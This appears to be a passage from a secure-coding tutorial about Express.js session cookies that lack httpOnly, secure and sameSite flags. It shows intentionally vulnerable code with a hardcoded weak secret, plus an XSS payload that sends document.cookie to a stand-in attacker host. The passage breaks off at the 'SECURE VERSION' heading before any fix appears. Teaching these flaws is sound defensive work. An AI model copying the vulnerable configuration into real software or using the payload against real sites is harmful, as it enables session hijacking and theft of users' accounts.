Setting up session cookies requires careful attention to security flags. Missing the `httpOnly`, `secure`, and `sameSite` flags is one of the most common authentication vulnerabilities that enables session hijacking attacks.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const session = require('express-session');

const app = express();

// VULNERABLE: Missing critical security flags on session cookie
app.use(session({
  secret: 'mysecret123',
  name: 'sessionId',
  resave: false,
  saveUninitialized: true,
  cookie: {
    maxAge: 86400000  // 24 hours
    // No httpOnly flag - JavaScript can access cookie
    // No secure flag - Cookie sent over HTTP
    // No sameSite flag - Vulnerable to CSRF
  }
}));

app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Simplified authentication (assume it validates)
  if (authenticateUser(username, password)) {
    req.session.userId = getUserId(username);
    req.session.authenticated = true;
    res.json({ success: true });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.listen(3000);
```

**Attack Payload**:
```html
<script>
// XSS payload that steals session cookie
fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

**Why This Is Dangerous**:
- **No HttpOnly**: JavaScript can read the session cookie via `document.cookie`, enabling XSS-based session theft
- **No Secure**: Cookie transmitted over unencrypted HTTP, vulnerable to man-in-the-middle interception
- **No SameSite**: Cookie sent with cross-origin requests, enabling CSRF attacks
- **Weak Secret**: Hardcoded, short secret enables session forgery

**SECURE VERSION**:

